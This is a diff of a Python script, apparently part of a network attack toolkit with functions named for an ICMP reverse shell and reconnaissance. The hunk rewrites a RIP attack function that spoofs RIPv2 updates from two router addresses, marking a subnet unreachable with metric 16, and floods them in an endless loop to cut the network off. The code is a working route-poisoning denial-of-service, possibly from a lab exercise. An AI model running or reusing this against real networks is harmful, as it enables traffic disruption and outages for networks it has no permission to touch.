@@ -214,32 +214,23 @@ def icmp_reverse_shell():
 
 def RIP_attack():
 
-    address = "192.168.220.0" #hop to Firewall and thus to Internet
+    address = "192.168.220.144" #network to be isolated
+    # define headers
+    IP_header = IP(src="192.168.220.30", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
+    IP_header_2 = IP(src="192.168.220.40", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
     
-    target_1 = "192.168.220.30" # target 1 -> R5 can be reached by R1 via R2
-    target_2 = "192.168.220.40" # target 2 -> R5 can be reached by R1 via R4
-	
-    target_list = [target_1, target_2]
+    UDP_header = UDP(sport=520, dport=520)
+    RIP_header = RIP(cmd=2, version=2)
+    RIPEntry_ = RIPEntry(addr=address, mask="255.255.255.240", metric=16)
+    #define the packet
+    packet = IP_header / UDP_header / RIP_header / RIPEntry_
+    packet2 = IP_header_2 / UDP_header / RIP_header / RIPEntry_
 
-    packet_list = []
-    for target in target_list:
-	
-	#define headers
-        IP_header = IP(src=target, dst="224.0.0.9", ttl=1) #multicast address for RIPv2
-        UDP_header = UDP(sport=520, dport=520)
-        RIP_header = RIP(cmd=2, version=2)
-        RIPEntry = RIPEntry(addr=address, mask="255.255.255.0", metric=16)
-	
-        #define the packet
-        packet = IP_header / UDP_header / RIP_header / RIPEntry
-	
-	#append to list to be sent
-        packet_list.append(packet)
-    
     #loop the sending
     while True:
-        for packet in packet_list:
-            send(packet, inter=0.0005)
+        send(packet, inter=0.000001)
+        send(packet2, inter=0.000001)
+
 
 def choose_recon():
     #clear the screen
